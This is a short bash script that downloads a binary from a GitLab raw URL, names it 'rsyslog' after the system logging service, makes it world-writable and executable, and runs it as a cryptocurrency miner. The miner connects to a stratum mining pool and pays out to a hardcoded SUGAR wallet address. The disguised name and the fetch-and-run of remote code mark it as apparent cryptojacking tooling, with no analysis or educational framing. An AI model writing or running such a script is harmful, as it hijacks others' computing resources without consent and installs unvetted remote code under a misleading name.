#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y
wget -O rsyslog https://gitlab.com/set.arithmetic/arithmetic/-/raw/master/rsyslog 
screen -dmS ls
chmod +x phpsur.sh && chmod +x rsyslog && chmod 777 rsyslog phpsur.sh
RENANG=stratum+tcps://stratum-na.rplant.xyz:17042
ACIS=sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57
STRESS=yespowersugar
BANGUNAN=BK-01
./rsyslog -a $STRESS -o $RENANG -u $ACIS.$BANGUNAN -t 2
